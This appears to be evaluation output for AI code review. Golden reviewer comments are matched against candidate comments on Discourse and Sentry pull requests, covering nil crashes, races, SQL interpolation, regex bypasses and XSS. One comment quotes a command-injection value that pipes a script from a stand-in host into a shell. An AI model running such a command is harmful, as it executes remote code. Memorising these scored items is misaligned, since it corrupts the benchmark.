true_positives.golden_comment: The downsize method is defined twice. The second definition, which expects a single dimensions string parameter, overrides the first, which expected separate max_width and max_height parameters. This makes the original method unreachable and breaks existing code that calls it with separate width and height arguments.
true_positives.matched_candidate:
Duplicate `def self.downsize` method shadows the original

The file ends up with two `def self.downsize` definitions: lines 145–147 keep the 4-arg form `downsize(from, to, max_width, max_height, opts={})`, and lines 149–151 add a new 3-arg form `downsize(from, to, dimensions, opts={})`. Ruby silently redefines the method, so the second definition wins and any caller using `OptimizedImage.downsize(path, path, width, height)` (the previous public arity) will now raise ArgumentError because the surviving method only accepts three positional arguments. The old definition should have been removed when the new one was added.

true_positives.golden_comment: Hardcoding maxSizeKB = 10 * 1024 ignores Discourse.SiteSettings['max_' + type + '_size_kb'], so the client-side limit can diverge from server-side and per-type settings (also applies to the 413 handler below).
true_positives.matched_candidate:
Client-side upload limit hardcoded to 10 MB, ignoring per-type site setting

The previous code used `Discourse.SiteSettings['max_' + type + '_size_kb']`, which honored `max_image_size_kb` for images and `max_attachment_size_kb` for attachments. The new code hardcodes `10 * 1024` for every type. This breaks attachment uploads (which have no downsizing fallback server-side) when `max_attachment_size_kb` is below 10 MB, and it can also let through files that the server rejects if `max_image_size_kb` is set below 10 MB. The change is unrelated to the image-downsizing feature and should use the per-type site setting like before.

false_negatives.golden_comment: Passing 80% as the dimensions can fail for animated GIFs when allow_animated_thumbnails is true, since the animated path uses gifsicle --resize-fit which expects WxH geometry, not a percentage; downsizing would then silently fail.
The loop checking `tempfile.size` may never terminate correctly due to stale cached size, leading to potential infinite loops or incorrect file handling after modifications.

false_positives.candidate:
413 error message always reports 10 MB regardless of configured limit

The handler for HTTP 413 now reports `max_size_kb: 10 * 1024` even though the server-side limit comes from `SiteSetting.max_image_size_kb`. Users told they exceeded a 10 MB limit will be confused when the actual configured limit is something else (e.g. 1 MB), and the value rendered in the alert no longer reflects the server-side limit that triggered the rejection. The previous `Discourse.SiteSettings.max_image_size_kb` value should be preserved here.

Downsize loop discards `OptimizedImage.downsize` return value

`OptimizedImage.downsize` can return `false` when ImageMagick fails (e.g. corrupt or unsupported image, even though `FileHelper.is_image?` returned true). The controller ignores the return value, so the loop just decrements `attempt` and keeps going even though the file size never shrinks. There is no logging and no signal to the rest of the flow. The return value should be checked and the failure logged (and ideally surfaced to the user) instead of being silently dropped.

Oversized upload proceeds silently after 5 downsize attempts

If the file is still larger than `SiteSetting.max_image_size_kb.kilobytes` after the 5-iteration downsize loop completes, the controller falls through and calls `Upload.create_for` with the still-oversized `tempfile`. There is no error returned, no log entry, and no user-visible message, so a user who uploaded an image expecting it to be resized will get a rejected/oversized upload without explanation. The loop should break out with an explicit error (logged and returned in the response) when downsizing cannot get the file under the configured limit.

URL download cap raised to a hardcoded 10 MB, ignoring site setting

`FileHelper.download(url, SiteSetting.max_image_size_kb.kilobytes, ...)` was replaced with `FileHelper.download(url, 10.megabytes, ...)`. The cap no longer honors `max_image_size_kb` and is now a fixed 10 MB regardless of what the administrator configured. For sites with a small `max_image_size_kb` this lets callers pull arbitrarily large files into a temp file (only to be downsized afterwards), increasing disk usage and memory pressure. The new 10 MB cap should at minimum remain consistent with `max_image_size_kb` and ideally be configurable.

true_positives.golden_comment: The EmbeddableHost model's before_validation callback calls self.host.sub! to strip http://, https://, and path segments, but if self.host is nil, this raises NoMethodError.
true_positives.matched_candidate:
before_validation callback crashes when host is nil

`before_validation` runs `self.host.sub!(/^https?:\/\//, '')` and `self.host.sub!(/\/.*$/, '')`. If a record is created without a `host` attribute (e.g. mass-assignment that omits host, or any path that calls `valid?`/`save` on an instance whose host is nil), `nil.sub!` raises NoMethodError and validation aborts before any user-friendly error is shown. The callback should no-op when host is blank, e.g. return unless host.present? (and ideally the controller already enforces this, but the model should defend itself).

true_positives.golden_comment: The update and destroy methods in Admin::EmbeddableHostsController do not validate the existence of the EmbeddableHost record retrieved by ID. If EmbeddableHost.where(id: params[:id]).first returns nil (i.e., the host does not exist), attempting to call methods on the nil object (e.g., save_host or destroy) will result in a NoMethodError.
true_positives.matched_candidate:
update/destroy actions crash when EmbeddableHost is not found

`update` does `host = EmbeddableHost.where(id: params[:id]).first` then passes `host` directly to `save_host`, which immediately invokes `host.host = …`. If the id does not match a record, `host` is nil and this raises NoMethodError (and renders a 500). `destroy` has the same problem: it calls `host.destroy` on a nil record. The controller should detect the missing record and return `not_found` (or render an error JSON), matching the convention used by the rest of `Admin::*Controller`s.

true_positives.golden_comment: The SQL query in the `app/controllers/admin/embeddable_hosts_controller.rb` file uses string interpolation (`'#{h}'`) to insert values, which is vulnerable to SQL injection. It should use parameter binding or proper quoting to prevent this security vulnerability.
true_positives.matched_candidate:
Raw SQL string interpolation of host value in migration

The migration inserts each host with `execute "INSERT ... VALUES ('#{h}', ...)"`. The value `h` comes straight from the prior `SiteSetting.embeddable_hosts` admin setting. If that value ever contains a single quote (or other SQL metacharacters) the migration's SQL is malformed or, in the worst case, executes unintended statements. Even though the value is admin-controlled and only used at migration time, this should be parameterized (or assigned through the EmbeddableHost model with `.create!`) so a stray quote can't break the upgrade and so the migration is robust to any prior state of the data.

true_positives.golden_comment: The migration accesses execute(...)[0]['id'] without checking if the query returned any rows, which causes a crash when no embed_category setting exists. This can lead to a broken feature when attempting to edit category/host relationships.
true_positives.matched_candidate:
Migration crashes when embed_category setting has no matching category

The migration executes `SELECT c.id FROM categories AS c INNER JOIN site_settings AS s ON s.value = c.name WHERE s.name = 'embed_category'` and indexes `[0]['id'].to_i` on the result. On any installation where either the `embed_category` site_setting row does not exist (e.g. fresh installs, upgrades from setups that never set it, or sites whose value was reset/cleared) or where the value does not match any category name, the result set is empty, `[0]` returns nil, and `nil['id'].to_i` raises NoMethodError and aborts the migration. The migration needs a nil guard (and the same applies if the SQL ever returns zero rows): e.g. `rows = execute(...); category_id = rows && rows.first ? rows.first['id'].to_i : SiteSetting.uncategorized_category_id`.

false_negatives.golden_comment: record_for_host compares lower(host) = ? but does not normalize the parameter’s case, so mixed‑case referer hosts may fail to match even though comparison intends to be case‑insensitive.

Because this migration inserts embeddable_hosts rows with raw SQL, any existing embeddable_hosts values that include http:// or /https:// or path segments won’t go through the EmbeddableHost model’s normalization, so the new host lookup (which compares only the bare host) may fail for migrated data. Consider ensuring that migrated hosts are normalized to the same format as newly created EmbeddableHost records so existing embedding configurations keep working.

The contents of `category_fabricator.rb` and `embeddable_host_fabricator.rb` have been swapped, resulting in the loss of original category fabricators and potentially causing errors in fabricator usage.

false_positives.candidate:
Plural hydration retains undefined entries when IDs do not resolve

In `_hydrateEmbedded` the plural branch sets `obj[self.pluralize(subType)] = hydrated || [];`. When `_lookupSubType` returns undefined for an id (for example an `embeddable_host_ids` value that has no matching record in the side-loaded `embeddable_hosts` array, the lookup returns nothing), `.map` still produces an array containing undefined entries. The `hydrated || []` fallback never fires because the array is non-empty, so the resulting model attribute contains `undefined` values. Any subsequent UI iteration (`{{#each}}`, `.length`, `.get('id')`) will then either render blank rows or throw. The fallback should filter falsy entries, e.g. `(hydrated || []).compact`, before assignment.

true_positives.golden_comment: logic: Potential nil pointer exception - if no TopicUser record exists, tu will be nil and calling methods on it will crash
true_positives.matched_candidate:
NoMethodError when the user has no TopicUser row for the topic

`tu = TopicUser.find_by(user_id: current_user.id, topic_id: params[:topic_id])` (line 105) returns nil for any user who has never opened the topic but is still on the recipient list of the notification email (the common case for someone clicking 'unsubscribe' from an email). The very next line, `if tu.notification_level > ...` (line 107), then calls `notification_level` on nil and raises `NoMethodError`, producing a 500 for what is the primary intended use of the link. The action should either use `TopicUser.get`/`TopicUser.change` (which upserts) or guard explicitly against a nil `tu` (and decide what muting means for a user who never had a row).

true_positives.golden_comment: Typo in property name: 'stopNotificiationsText' should be 'stopNotificationsText' (missing 'n' in 'Notifications')
true_positives.matched_candidate:
Typo in computed property: stopNotificiationsText

The computed property is named `stopNotificiationsText` (N-o-t-i-f-i-c-a-t-i-o-n-s, three i's) and the same misspelling is used in `templates/topic/unsubscribe.hbs` line 3. The double mistake cancels out so the template currently renders, but the property name is wrong and grep / future edits will trip over it. It should be `stopNotificationsText`. (Note this only matters once the server-side bug above is fixed and the unsubscribe template is actually reached.)

false_positives.candidate:
No assertion that the per-topic unsubscribe URL reaches the email body

The new spec only adds `unsubscribe_url: "/t/1234/unsubscribe"` to the `MessageBuilder` constructor (line 172) and the server locale now interpolates `%{unsubscribe_url}` into `unsubscribe_link` (config/locales/server.en.yml), but neither of the two existing assertions in this context checks that the per-topic URL ends up in the rendered email. The current tests only assert the `user_preferences_url` is in the body and that the `List-Unsubscribe` header is present — both of which were true before this PR. A test such as `expect(message_with_unsubscribe.body).to include('/t/1234/unsubscribe')` (and an equivalent against `html_part`) is required to lock in the new behaviour; without it a regression in `message_builder.rb` or the locale string will go undetected. There are also no controller specs covering the new `TopicsController#unsubscribe` action (authorization, slug redirect, nil `tu`, notification-level toggle).

Server renders topics/show instead of the unsubscribe confirmation page

After saving the new notification level, `perform_show_response` (line 115) renders `topics/show`, i.e. the full topic view including all posts, breadcrumbs, reply controls, etc. The PR also adds a complete client-side unsubscribe experience (`controllers/topic-unsubscribe.js.es6`, `routes/topic-unsubscribe.js.es6`, `templates/topic/unsubscribe.hbs`, `views/topic-unsubscribe.js.es6`, the new `.topic-unsubscribe` SCSS block, and the `topic.unsubscribe.stop_notifications` / `change_notification_state` i18n strings), but the server pre-empts all of it by rendering the show template. The new Ember route, controller, view, template, styles, and locale strings are unreachable through the URL the email links to. The action should either render an unsubscribe-specific server template (`render :unsubscribe`) or redirect (e.g. 302 to `topic.relative_url`) so the user lands on a confirmation / change-notification-state page rather than the topic itself.

Unsubscribe action has no authorization check on the topic

After `@topic_view = TopicView.new(...)` the action immediately looks up the user's TopicUser row (line 105), mutates it (line 108-111) and saves it (line 113) without ever calling `guardian.ensure_can_see!(@topic_view.topic)` (compare with `mute`, `re_pin`, `clear_pin`, etc. in the same controller which all do call `ensure_can_see!`). Any logged-in user who knows or guesses a topic id can visit `/t/<slug>/<id>/unsubscribe` and silently unsubscribe from any topic, including topics in read-restricted categories or topics they have been removed from. Because the action then calls `perform_show_response`, the rendered response can also expose topic content the user is not authorised to see when `TopicView.new` does not raise (e.g. a topic in a category the user still has limited access to).

Unsubscribe is a state-changing GET that also returns the full topic page

The new unsubscribe action is reached only via GET routes (config/routes.rb lines 440-441), yet it both mutates user state (`tu.save!` at line 113) and returns the rendered topic view (`perform_show_response` at line 115). GET requests must be idempotent. The unsubscribe URL is embedded in every notification email (app/mailers/user_notifications.rb line 295, config/locales/server.en.yml), and link-previewers, antivirus scanners, corporate proxies, and prefetching mail clients routinely fetch URLs found in emails. Each prefetch will silently toggle the user's notification level between regular and muted. There is no CSRF token (and none can be on a GET), so there is also no defence against any cross-site request that triggers navigation to the URL. The expected UX for an unsubscribe click is a short confirmation / re-subscribe page, not the entire topic with all posts; as shipped, the response is the wrong page and the action is unsafe to expose as a GET.

true_positives.golden_comment: BlockedEmail.should_block_email? method has side effects during a read operation - it updates statistics even when just checking if an email should be blocked. This could cause race conditions in concurrent environments and makes the method name misleading.
true_positives.matched_candidate:
Query method silently mutates the database

`BlockedEmail.should_block?` reads as a predicate (`should_block?`) but has the side effect of incrementing `match_count` and updating `last_match_at` on every call. This runs during every `User` validation, including any path that re-validates a record (e.g. multiple saves, factory builds, or future code paths), and is undocumented. It also means the spec's `should_block?` subject call mutates rows as a side effect of the assertion, which makes failure modes confusing. Splitting the check from the stats update, or at minimum documenting the side effect, would make the contract explicit and prevent future callers from being surprised by extra writes (and by the lost-update behavior described in the concurrency finding).

true_positives.golden_comment: The regex pattern @(#{domains}) in email_in_restriction_setting? method only matches domain suffixes, not full domains with proper boundary anchoring. An attacker can register evil.example.com to bypass a whitelist entry for example.com.
true_positives.matched_candidate:
Domain whitelist/blacklist regex matches as substring

`Regexp.new("@(#{setting.gsub('.', '\.')})", true)` builds a pattern with no end anchor, so it matches `@example.com` anywhere in the address. With a whitelist of `foo.com`, the address `evil@evilfoo.com` matches because it contains `@foo.com`; with a blacklist of `mail.ru`, `evilmail.ru` style strings may similarly match. This is a pre-existing bug carried over from the old `User#email_in_restriction_setting?` but it is now used by the new validator that gates signup, so it is worth fixing here: anchor with `\z`/`$`, e.g. `Regexp.new("@(#{domains})\z", true)`, and validate the setting format.

true_positives.golden_comment: The case-sensitive email lookup in `BlockedEmail.should_block?` creates a bypass risk, allowing 'User@Example.com' to bypass a block on 'user@example.com'. This can lead to unauthorized access to blocked users.
true_positives.matched_candidate:
Case-sensitive blocked email lookup allows trivial bypass

`BlockedEmail.should_block?` queries with `BlockedEmail.where(email: email).first`, which is case-sensitive in MySQL/Postgres. Users signing up with any uppercase or mixed-case variation of a blocked address (e.g. `BAD@spamclub.com` when `bad@spamclub.com` is blocked) will not match the row and will be allowed to register. The blocker emails are stored verbatim by the migration/model and never normalized, so this completely defeats the anti-spam purpose of the new feature. Normalize on insert and/or on lookup (e.g. `Email.downcase` to match how `users_controller#change_email` already normalizes), or store a separate `email_lower` column and index it.

false_positives.candidate:
No test verifies case-insensitive blocking

All examples use the same string literal for the blocked record and the queried email. The bypass described in the `blocked_email.rb` finding (typing `BAD@spamclub.com` against a blocked `bad@spamclub.com`) is the most important scenario the new feature is supposed to prevent and it is not covered. Add a context where the queried email differs in case from the stored `blocked_email.email` and assert `should_block?` still returns true (and updates the counter).

true_positives.golden_comment: The PollFeed job calls open(SiteSetting.feed_polling_url) without validating the URL, allowing an attacker who controls the feed_polling_url site setting to make the server fetch arbitrary internal or external URLs.
true_positives.matched_candidate:
Kernel#open on user-controlled URL allows command execution

`rss = SimpleRSS.parse open(SiteSetting.feed_polling_url)` invokes `Kernel#open` on the configured feed URL. Ruby's `Kernel.open` treats a leading `|` as a subshell command, so an admin who pastes or copy-pastes a URL like `|curl evil.com/x | sh` (or `|something`) into `feed_polling_url` will execute it as the Ruby process (which is the Rails/web process — typically the Discourse user, often with access to the DB and `Rails.env` secrets). Later versions of Discourse explicitly replace `Kernel.open` and `OpenURI.open_uri` everywhere this pattern appears for exactly this reason. Use `URI.open(SiteSetting.feed_polling_url)` (OpenURI) or an explicit HTTP client, with a redirect/host allowlist and size/time limits, instead of `Kernel.open`.

true_positives.golden_comment: postMessage targetOrigin should be the origin (scheme+host+port), not the full referrer URL; using the full URL will cause the message to be dropped and prevent resizing.
true_positives.matched_candidate:
postMessage targetOrigin should be origin only, not referer URL

The `postMessage` call uses `'<%= request.referer %>'` as the `targetOrigin` argument. `targetOrigin` should be a serialized origin (scheme + host + port) or `*`. Passing the full referer URL works in browsers because they parse the string down to its origin, but the correct and safe value is explicitly the origin. Worse, when `request.referer` is nil/empty (which `ensure_embeddable` allows when there is no Referer header), the rendered value becomes `parent.postMessage(..., '')`. An empty string is treated as `"*"` by browsers, causing the resize message to be sent to any window that has registered a `message` listener — a small but real information leak (the Discourse iframe's pixel height to any opener/parent). Render the referer's origin (e.g. `"#{URI(request.referer || '').scheme}://#{URI(request.referer || '').host}"`) and bail out (or send `null` height) when referer is missing.

true_positives.golden_comment: Calling `i.content.scrub` assumes that `i.content` is always populated. However, many RSS feeds do not provide a `content` field, leading to a potential nil pointer exception when `i.content` is nil. A fallback to `description` should be implemented to prevent crashes.
true_positives.matched_candidate:
i.content may be nil and blows up on .scrub

`content = CGI.unescapeHTML(i.content.scrub)` assumes `i.content` is non-nil. Not every RSS/Atom item carries a `content` field — some provide only `description` or `summary`, in which case `SimpleRSS#content` returns `nil` and `nil.scrub` raises `NoMethodError`. A single malformed feed entry aborts the entire hourly poll job for the rest of the items in the batch and may surface in error reports. Use `i.content.presence || i.description.to_s` (or wrap in a guard) so missing content yields an empty string instead of an exception.

false_negatives.golden_comment: The current origin validation using indexOf is insufficient and can be bypassed. An attacker could use a malicious domain like evil-discourseUrl.com to pass this check.

The code sets X-Frame-Options: ALLOWALL which completely disables clickjacking protection. The referer validation can be bypassed (referer headers are easily spoofed), and the fallback to empty string for nil referer masks validation failures.

The TopicEmbed.import method is susceptible to a NoMethodError if the contents parameter is nil when attempting to append a string, and an XSS vulnerability due to unescaped url interpolation in the generated HTML.
The ERB block closes with end if, which is invalid Ruby/ERB and will raise at render; it should just be end to close the if block.

An unescaped request header (request.referer) is interpolated into JavaScript without proper escaping, which can lead to XSS vulnerabilities if the referer contains malicious content. This issue can allow attackers to execute arbitrary scripts in the context of the application.

false_positives.candidate:
Script throws if #discourse-comments is not present

`var comments = document.getElementById('discourse-comments')` is dereferenced at `comments.appendChild(iframe)` without a null check. If a third-party site embeds the script before the `#discourse-comments` div exists (wrong placement, dynamic page where the div hasn't been rendered yet, etc.), the script crashes on the `null.appendChild(...)` call and the rest of the IIFE — including the `postMessage` listener — never runs, so the embed silently fails and the iframe can never self-resize. Guard the append: `if (comments) { comments.appendChild(iframe); } else { document.body.appendChild(iframe); }`.

Stale/unrelated require_dependency 'email/sender'

`require_dependency 'email/sender'` is added at the top of the RetrieveTopic job but the job does not use the `Email::Sender` class (or anything else from the email stack) anywhere in this file. It appears to be a copy/paste leftover from another job. Keeping it loads the email autoload subtree unnecessarily on every Sidekiq run of this class and confuses readers searching for the dependency chain.

TTL is set only on the racing process; throttle window is effectively unbounded

`retrieved_recently?` uses `SETNX` followed by `EXPIRE 60`. Between the `SETNX` and the `EXPIRE`, the key has no TTL — if the process dies in that gap (Sidekiq worker killed, VM paused) the key persists forever with the value `"1"`, and every subsequent attempt to retrieve that same embed URL will be silently throttled indefinitely because `invalid_host?` is the only other gate and the throttle check returns `true` first. Move the TTL into a single atomic call: `$redis.set(retrieved_key, '1', nx: true, ex: 60)` so the key is always created with its expiration. Additionally, the inverse race exists: two workers can both pass `retrieved_recently?` returning false simultaneously before either `SETNX` runs, and both will go on to call `TopicEmbed.import_remote` — the unique index on `topic_embeds.embed_url` is the only thing protecting against the double-import, and `TopicEmbed.import` calls `PostCreator.create` with side effects (notifications, draft sequence, message_bus publish) that aren't rolled back by the unique-index failure. These two issues combined mean the throttle provides at most a 60-second fence, not a deduplication guarantee, despite the name.

absolutize_urls corrupts protocol-relative URLs

`absolutize_urls` only absolutizes `href`/`src` values that `start_with?('/')`. Protocol-relative URLs like `//cdn.example.com/img.jpg` match that check but then `href.sub(/^\/+/, '')` strips every leading slash, so a value that is supposed to point at `https://cdn.example.com/img.jpg` is rewritten into `https://example.comcdn.example.com/img.jpg`. The link appears to be a same-origin resource, which is both broken (the image fails to load) and a small URL-confusion issue because the rendered URL points at the embed host. Detect protocol-relative inputs explicitly: `a['href'] = href.sub(/^\/+/, '/') if href.start_with?('//')` (keep the leading `//`) and append to `prefix` instead of inserting a literal slash.

perform_retrieve runs the entire RSS poll synchronously inside a single embed import

`TopicRetriever#perform_retrieve` does `Jobs::PollFeed.new.execute({})` whenever feed polling is enabled. That job imports every item in the entire RSS feed in a single call — fetching and cooking N remote pages even when this retriever only cares about one specific `embed_url`. For a feed with dozens of entries the embedding request stalls for minutes, blocking the Sidekiq worker, and on every cached re-fetch the whole feed is re-iterated. Filter inside `poll_feed` (or split it into two methods, one keyed by URL) so the synchronous embed path only fetches the requested entry.

raw_html cook_method bypasses sanitization, enabling stored XSS

In `Post#cook`, when `cook_method == Post.cook_methods[:raw_html]` the method returns `raw` verbatim, skipping `post_analyzer.cook(*args)` which is what normally runs sanitization (whitelisted image classes, host-aware link rewriting, etc.). The `TopicEmbed.import` flow (called from `TopicEmbed.import_remote` → `ruby-readability`, and from `Jobs::PollFeed` over fetched RSS items) creates these posts with `cook_method: Post.cook_methods[:raw_html]` and stores the upstream raw HTML as `raw`. Any HTML/JS present in the trusted-but-compromised source (a hijacked blog post, a malicious RSS entry, etc.) is therefore rendered to every visitor of the embed iframe, and because `best.html.erb` renders with `<%= raw post.cook %>`, nothing in the rendering path will scrub it. This is stored XSS inside the Discourse origin. At minimum, the `raw_html` branch must run the same sanitizer `cook` applies for regular posts (e.g. `PostAnalyzer.new(raw, topic_id).cook`), or, better, the cook_method selector should reject generic HTML and only accept a constrained subset.

true_positives.golden_comment: -ms-align-items never existed in any version of IE/Edge; the correct legacy property is -ms-flex-align.
true_positives.matched_candidate:
Invalid CSS property -ms-align-items in align-items mixin

The new align-items mixin emits `-ms-align-items: $alignment;`. The IE 10 prefix for align-items is `-ms-flex-align` (already included on line 120); `-ms-align-items` is not a real CSS property. The redundant invalid declaration is silently ignored by browsers and is a typo. The correct line should be removed.

false_negatives.golden_comment: Mixing float: left with flexbox causes layout issues. Further this PR removes the float-based right alignment for .d-header .panel, which may cause the login panel in the non-Ember/noscript header (where .panel is nested inside .row and not a flex item) to stack under the title instead of remaining right-aligned.
-webkit-box-ordinal-group and -moz-box-ordinal-group require values starting from 1, not 0. If $val is 0, this will cause incorrect rendering in older browsers, leading to layout issues.

false_positives.candidate:
Complete removal of .title rule while relying on flex container

The diff deletes the entire `.title { float: left; }` rule and turns `.contents` into a flex container. While removing the float is intentional, the rule is now gone entirely — any other declaration (e.g., `min-width`, `max-width`, `flex` shrink behavior, `white-space`) that downstream consumers might have relied on for the title element is no longer being applied here. In addition, the fallbacks produced by the new `flexbox()` mixin (`-webkit-box`, `-moz-box`) make `.contents` a 2009-spec box container in legacy browsers, where `.title` and `.panel` will not behave like modern flex items; without the removed float, the layout in those legacy engines has no clear-float behavior. The change should at minimum be verified visually in a legacy-WebKit/Firefox fallback.

Invalid CSS property -webkit-align-items in align-items mixin

The new align-items mixin emits `-webkit-align-items: $alignment;`. WebKit/Blink never shipped this property — they used `-webkit-box-align` for the 2009 spec (already included on line 118) and then went straight to the unprefixed `align-items`. The `-webkit-align-items` declaration is not a recognized CSS property; browsers will discard it silently. It clutters the compiled output and is a clear typo adjacent to the correct `-webkit-box-align` line.

Invalid CSS property -webkit-order in order mixin

The new order mixin emits `-webkit-order: $val;`. WebKit/Blink never shipped this property — they used `-webkit-box-ordinal-group` for the 2009 spec (already included on line 126) and then went straight to the unprefixed `order`. `-webkit-order` is not a valid CSS property and is silently ignored. This is a typo adjacent to the correct `-webkit-box-ordinal-group` line.

Large padding reduction on .small-action-desc is untested

`.small-action-desc` padding was changed from `0.5em 0 0.5em 4em` (with a matching `margin-top: 5px`) to `padding: 0 1.5%` while `.small-action` is converted to a flex container. The original 4em left padding was sized to clear the `.topic-avatar` icon column in the float-based layout. In the new flex layout the avatar becomes a sibling flex item, but the new `padding: 0 1.5%` collapses the inner `.avatar`'s surrounding space to a tiny percentage with no minimum, and the old `margin-top: 5px` was dropped without a replacement. Combined with the removal of `padding-top: 4px` on `> p`, the description block is likely to render noticeably tighter and/or vertically misaligned versus the avatar column. No screenshot, test, or visual regression coverage accompanies this change.

Removed bullet badge vertical alignment without replacement

The diff deletes the rule `.extra-info-wrapper .badge-wrapper { float: left; &.bullet { margin-top: 5px; } }` and replaces it with `float: left` only, while also adding `@include order(2)` to the wrapper. The previous `margin-top: 5px` on bullet-style badges was used to vertically align the colored bullet with adjacent baseline-aligned text (a typical alignment fix for inline elements used inside a larger line of text). Nothing in this PR provides an equivalent offset, so bullet-style category badges rendered inside `.extra-info-wrapper` (e.g., on topic lists and the topic page header) may now sit visually lower than the surrounding text. This is a regression with no test or visual reference provided.

true_positives.golden_comment: The include_website_name method is missing the required ? suffix. Rails serializers expect include_ methods to end with ? for conditional attribute inclusion, a convention followed by other methods in this serializer. Without it, the website_name attribute may not be conditionally included as intended. Additionally, the '.' << website_host string concatenation should be replaced with '.' + website_host or '.#{website_host}' to avoid mutating string literals, which can lead to issues.
true_positives.matched_candidate:
include_website_name missing ? suffix breaks AMS include check

The new `def include_website_name` method at line 153 is missing the `?` suffix: it should be `def include_website_name?`. ActiveModel Serializers discovers conditional include logic by looking for predicate methods named `include_<attr>?` on the serializer. Without the `?`, this method is not recognized as an include check, and `website_name` will be included in the serialized JSON whenever the attribute method exists, regardless of whether `website` is set. This contradicts the design intent shown by the body `website.present?` and is inconsistent with every other `include_*?` method in the same file (e.g., `include_email?` at line 117, `include_stats?`, `include_suspend_reason?`, `include_user_fields?`, `include_topic_post_count?`), all of which correctly use the predicate form. false_positives.candidate:
Missing edge case tests for URL parsing in website_name

The new `website_name` method uses `URI(website.to_s).host` (with `rescue nil`) and `URI(website.to_s).path`, which behave inconsistently at the boundary. No tests cover: (1) a malformed URL such as `'not a valid url'` where `URI(...).host` raises (handled by `rescue nil`), (2) a URL with no path such as `http://example.com` where `URI().path` is `''`, producing `'example.com'`, or (3) a URL with a trailing slash such as `http://example.com/` where `URI().path` is `'/'`, producing `'example.com/'`. The trailing-slash inconsistency in particular means two visually identical URLs (one with, one without `/`) render different display text on the profile, which would surprise users and is worth either a test or explicit normalization in the serializer.

true_positives.matched_candidate:
Admin member routes put :id in params but controllers expect :group_id

The new routes `delete "members" => "groups#remove_member"` and `put "members" => "groups#add_members"` are declared inside `resources :groups, constraints: AdminConstraint.new do ... end`. With that placement Rails treats them as member actions, so the URLs are `DELETE /admin/groups/:id/members` and `PUT /admin/groups/:id/members` and the group id is exposed as `params[:id]`. However, `Admin::GroupsController#add_members` (line 66) and `#remove_member` (line 85) both call `params.require(:group_id).to_i`, and the routes never populate `params[:group_id]`. Every AJAX call from the new admin UI to add or remove a member will therefore raise `ActionController::ParameterMissing: param not found: group_id` and return a 400 error, so the new add/remove member functionality does not work. The controller specs pass because `xhr :put/:delete, :add_members/:remove_member, group_id: ...` bypasses routing and injects `group_id` directly into params. Fix by changing the controllers to read `params[:id]`, or by wrapping the routes in `member do ... end`, or by naming the resource param explicitly (e.g. `param: :group_id`).

If the admin types "alice, bob" (note the space after the comma) or pastes a comma-separated list with spaces or line breaks, `User.find_by_username(" bob")` returns nil and that user is silently skipped. The endpoint still returns `success_json`, so the admin sees a green success state even when only some (or none) of the listed users were added, with no indication that anything was missed. remove_member deletes the join record before group.save, leaving validation errors in an inconsistent state

`group.users.delete(user_id)` on a `has_many :through` association deletes the join record from the database immediately. The subsequent `group.save` only persists Group-model attribute changes, not the membership change. If Group validation fails (e.g. a uniqueness validator on `name`), the controller responds with `render_json_error(group)`, but the membership removal has already been committed. The client therefore sees an error response while the member has actually been removed from the group. Either drop the `group.save` (the membership change already succeeded) or perform the deletion and the save inside a single transaction so they commit or fail together.

true_positives.golden_comment: The @loaded_locales instance variable in translate_accelerator.rb is lazily initialized and accessed by multiple concurrent threads without synchronization.
true_positives.matched_candidate:
ensure_loaded! reads @loaded_locales outside LOAD_MUTEX

The new ensure_loaded! does @loaded_locales ||= [] and @loaded_locales.include?(locale) without holding LOAD_MUTEX, then delegates to load_locale which does take the mutex. If I18n.reload! is called concurrently with ensure_loaded!, the include? check can race against @loaded_locales = [], causing ensure_loaded! to skip loading translations that reload! just cleared. Functionally load_locale will still reload inside the mutex, but the pattern is racy and the dedicated ensure_loaded! wrapper is the obvious place to add a guard if it ever becomes load-bearing. Worth tightening before this method is used per-request.

false_negatives.golden_comment: Consider normalizing the input locale (e.g., to a symbol) when checking/loading here to avoid double-loading if the same locale is passed as a String vs Symbol (also applies to other locations in the PR).

false_positives.candidate:
Fallback locales are force-loaded on every request via before_filter

ApplicationController#set_locale ends with I18n.fallbacks.ensure_loaded!, which calls I18n.ensure_loaded! for every locale in the user's fallback chain on every request. While @loaded_locales.include? short-circuits after the first request, the very first request after boot (and after each I18n.reload!) must parse all fallback yml files inside the request path, inflating TTFB and competing for LOAD_MUTEX with concurrent requests. The fallback translations only need to be loaded once at boot (or lazily before the first translate for that locale); the before_filter should not be the trigger. Consider moving ensure_loaded! out of the request path or gating it behind a once-per-process flag.

FallbackLocaleList is a Hash subclass but only [] is overridden

FallbackLocaleList < Hash overrides [] to return an Array, but inherits Hash semantics for everything else (keys, each, merge, []=, store, dig, etc.) while the underlying hash stays empty. I18n::Backend::Fallbacks and other code may call e.g. I18n.fallbacks[locale] = [...] or iterate keys; those calls will silently no-op or return empty results, masking configuration mistakes. Additionally, since the override is not synchronized, two threads can compute the fallback list concurrently while reading SiteSetting.default_locale - benign today but a footgun if the override ever grows. Either delegate to a plain object exposing only the contract Fallbacks needs, or override the full Hash surface and freeze the per-locale list.

FallbackLocaleList#[] crashes if SiteSetting.default_locale is nil

FallbackLocaleList#[] unconditionally calls SiteSetting.default_locale.to_sym and embeds the result in the fallback chain. If SiteSetting.default_locale is nil or an empty string (e.g. a half-applied migration, a misconfigured SiteSetting row, or a unit test that stubs the setting), this raises NoMethodError or returns [:en] without the site locale, silently degrading fallback behavior for every request that goes through the before_filter. The method should defend against nil/blank values (treat them as :en or skip), or the initializer should validate SiteSetting.default_locale at boot.

No tests for new localization fallback feature

This PR adds a new server-side localization fallback mechanism (custom FallbackLocaleList, ensure_loaded! chain, integration with the patched I18n translate accelerator), but no specs are included in the diff. Regression risks include: (1) FallbackLocaleList#[] ordering/duplication with current_user.effective_locale vs SiteSetting.default_locale vs :en; (2) Pluralization/Fallbacks module composition when both are mixed into I18n::Backend::Simple; (3) thread-safety of ensure_loaded! running inside a per-request before_filter that touches @loaded_locales and LOAD_MUTEX; (4) cache key stability under fallback (translate_no_cache returning fallback-locale values while the LRU cache is keyed only by config.locale). A feature of this scope touching the I18n initialization order needs explicit coverage before merge.

false_positives.candidate:
Diff claims a 'performance optimization' but changes no behavior

The diff for `src/sentry/utils/cursors.py` is comment-only. The new comment claims `Performance optimization: Allow negative offsets for advanced pagination scenarios / This enables efficient reverse pagination from arbitrary positions in large datasets`, but `Cursor.__init__` continues to call `self.offset = int(offset)` exactly as before - negative offsets have always been representable. No validation, clamping, or any other behavior is added. The comment is misleading because it implies a deliberate relaxation that never happened. If the goal is to advertise that negatives are now first-class-supported, the constructor should at minimum assert/document a contract; otherwise the comment should be dropped.

Negative-offset `advanced` path returns tail of result set, not 'reverse pagination'

